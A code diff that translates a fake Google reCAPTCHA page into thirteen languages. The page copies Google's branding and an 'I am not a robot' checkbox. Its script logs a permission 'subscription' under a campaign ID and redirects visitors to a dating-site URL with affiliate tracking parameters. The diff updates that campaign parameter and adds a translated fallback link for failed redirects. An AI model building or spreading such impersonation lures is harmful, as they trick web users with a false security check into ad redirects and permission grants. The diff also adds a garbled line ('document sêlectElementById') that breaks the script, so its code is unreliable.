@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -19,7 +19,7 @@
             transform: translate(-50%, -50%);
             display: flex;
             flex-direction: column;
- goda: flex-start;
+            align-items: flex-start;
             gap: 10px;
         }
         .captcha-container {
@@ -142,52 +142,153 @@
         <div class="captcha-container">
             <div class="captcha-left">
                 <input type="checkbox" id="captcha" class="captcha-checkbox">
-                <span class="captcha-text">Я не робот</span>
+                <span class="captcha-text">I am not a robot</span>
             </div>
             <div class="captcha-right">
                 <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                 <span class="captcha-brand">reCAPTCHA</span>
                 <div class="captcha-links">
-                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Конфиденциальность</a> - 
-                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Условия</a>
+                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Privacy</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Terms</a>
                 </div>
             </div>
         </div>
         <div class="button-container">
-            <button class="submit-button" id="submit-button">Отправить</button>
-            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
+            <button class="submit-button" id="submit-button">Submit</button>
+            <div class="error" id="error">Please verify that you are not a robot.</div>
         </div>
     </div>
 
     <script>
-        // Определение языка браузера
-        const userLanguage = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
-        const supportedLanguages = ['ru', 'en'];
-        const lang = supportedLanguages.includes(userLanguage) ? userLanguage : 'en';
+// Определение языка браузера
+const userLanguage = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
+const supportedLanguages = ['ru', 'en', 'es', 'fr', 'de', 'it', 'pt', 'zh', 'ja', 'ko', 'ar', 'hi', 'tr'];
+const lang = supportedLanguages.includes(userLanguage) ? userLanguage : 'en';
 
-        // Объект с переводами
-        const translations = {
-            ru: {
-                title: 'reCAPTCHA',
-                captchaText: 'Я не робот',
-                submitButton: 'Отправить',
-                error: 'Пожалуйста, подтвердите, что вы не робот.',
-                privacy: 'Конфиденциальность',
-                terms: 'Условия'
-            },
-            en: {
-                title: 'reCAPTCHA',
-                captchaText: 'I am not a robot',
-                submitButton: 'Submit',
-                error: 'Please verify that you are not a robot.',
-                privacy: 'Privacy',
-                terms: 'Terms'
-            }
-        };
+// Объект с переводами
+const translations = {
+    ru: {
+        title: 'reCAPTCHA',
+        captchaText: 'Я не робот',
+        submitButton: 'Отправить',
+        error: 'Пожалуйста, подтвердите, что вы не робот.',
+        privacy: 'Конфиденциальность',
+        terms: 'Условия',
+        redirectError: 'Не удалось выполнить редирект. <a href="{url}">Перейдите по ссылке</a>'
+    },
+    en: {
+        title: 'reCAPTCHA',
+        captchaText: 'I am not a robot',
+        submitButton: 'Submit',
+        error: 'Please verify that you are not a robot.',
+        privacy: 'Privacy',
+        terms: 'Terms',
+        redirectError: 'Unable to perform redirect. <a href="{url}">Follow the link</a>'
+    },
+    es: {
+        title: 'reCAPTCHA',
+        captchaText: 'No soy un robot',
+        submitButton: 'Enviar',
+        error: 'Por favor, verifica que no eres un robot.',
+        privacy: 'Privacidad',
+        terms: 'Términos',
+        redirectError: 'No se pudo realizar la redirección. <a href="{url}">Sigue el enlace</a>'
+    },
+    fr: {
+        title: 'reCAPTCHA',
+        captchaText: 'Je ne suis pas un robot',
+        submitButton: 'Envoyer',
+        error: 'Veuillez vérifier que vous n\'êtes pas un robot.',
+        privacy: 'Confidentialité',
+        terms: 'Conditions',
+        redirectError: 'Impossible d\'effectuer la redirection. <a href="{url}">Suivez le lien</a>'
+    },
+    de: {
+        title: 'reCAPTCHA',
+        captchaText: 'Ich bin kein Roboter',
+        submitButton: 'Absenden',
+        error: 'Bitte bestätigen Sie, dass Sie kein Roboter sind.',
+        privacy: 'Datenschutz',
+        terms: 'Nutzungsbedingungen',
+        redirectError: 'Weiterleitung nicht möglich. <a href="{url}">Folgen Sie dem Link</a>'
+    },
+    it: {
+        title: 'reCAPTCHA',
+        captchaText: 'Non sono un robot',
+        submitButton: 'Invia',
+        error: 'Per favore, verifica di non essere un robot.',
+        privacy: 'Privacy',
+        terms: 'Termini',
+        redirectError: 'Impossibile eseguire il reindirizzamento. <a href="{url}">Segui il link</a>'
+    },
+    pt: {
+        title: 'reCAPTCHA',
+        captchaText: 'Não sou um robô',
+        submitButton: 'Enviar',
+        error: 'Por favor, confirme que você não é um robô.',
+        privacy: 'Privacidade',
+        terms: 'Termos',
+        redirectError: 'Não foi possível realizar o redirecionamento. <a href="{url}">Siga o link</a>'
+    },
+    zh: {
+        title: 'reCAPTCHA',
+        captchaText: '我不是机器人',
+        submitButton: '提交',
+        error: '请验证您不是机器人。',
+        privacy: '隐私',
+        terms: '条款',
+        redirectError: '无法执行重定向。<a href="{url}">点击链接</a>'
+    },
+    ja: {
+        title: 'reCAPTCHA',
+        captchaText: '私はロボットではありません',
+        submitButton: '送信',
+        error: 'ロボットでないことを確認してください。',
+        privacy: 'プライバシー',
+        terms: '利用規約',
+        redirectError: 'リダイレクトできませんでした。<a href="{url}">リンクをクリック</a>'
+    },
+    ko: {
+        title: 'reCAPTCHA',
+        captchaText: '나는 로봇이 아닙니다',
+        submitButton: '제출',
+        error: '로봇이 아님을 확인해 주세요.',
+        privacy: '개인정보',
+        terms: '약관',
+        redirectError: '리디렉션을 수행할 수 없습니다. <a href="{url}">링크를 클릭하세요</a>'
+    },
+    ar: {
+        title: 'reCAPTCHA',
+        captchaText: 'أنا لست روبوتًا',
+        submitButton: 'إرسال',
+        error: 'يرجى التحقق من أنك لست روبوتًا.',
+        privacy: 'الخصوصية',
+        terms: 'الشروط',
+        redirectError: 'تعذر إجراء إعادة التوجيه. <a href="{url}">اتبع الرابط</a>'
+    },
+    hi: {
+        title: 'reCAPTCHA',
+        captchaText: 'मैं रोबोट नहीं हूँ',
+        submitButton: 'जमा करें',
+        error: 'कृपया सत्यापित करें कि आप रोबोट नहीं हैं।',
+        privacy: 'गोपनीयता',
+        terms: 'शर्तें',
+        redirectError: 'रीडायरेक्ट करने में असमर्थ। <a href="{url}">लिंक का पालन करें</a>'
+    },
+    tr: {
+        title: 'reCAPTCHA',
+        captchaText: 'Robot değilim',
+        submitButton: 'Gönder',
+        error: 'Lütfen robot olmadığınızı doğrulayın.',
+        privacy: 'Gizlilik',
+        terms: 'Şartlar',
+        redirectError: 'Yönlendirme yapılamadı. <a href="{url}">Bağlantıyı takip edin</a>'
+    }
+};
 
         // Функция для применения переводов
         function applyTranslations() {
-            document.documentElement.lang = lang; // Устанавливаем атрибут lang
+            document.documentElement.lang = lang;
             document.title = translations[lang].title;
             document.querySelector('.captcha-text').textContent = translations[lang].captchaText;
             document.getElementById('submit-button').textContent = translations[lang].submitButton;
@@ -202,7 +303,7 @@
         });
 
         // Ссылка для редиректа
-        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yp1';
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
 
         // Функция для логирования подписки
         function logSubscription(permission, subId = 'test_campaign') {
@@ -246,9 +347,7 @@
                 } catch (clickError) {
                     console.error('Ошибка программного клика:', clickError);
                     const error = document.getElementById('error');
-                    error.innerHTML = lang === 'ru' 
-                        ? `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`
-                        : `Unable to perform redirect. <a href="${redirectUrl}">Follow the link</a>`;
+                    error.innerHTML = translations[lang].redirectError.replace('{url}', redirectUrl);
                     error.style.display = 'block';
                 }
             }
@@ -382,7 +481,7 @@
         // События
         document.getElementById('captcha').addEventListener('click', () => {
             console.log('Чекбокс кликнут');
-            const checkbox = document.getElementById('captcha');
+            const checkbox = document sêlectElementById('captcha');
             if (!checkbox.checked) {
                 checkbox.checked = true;
             }
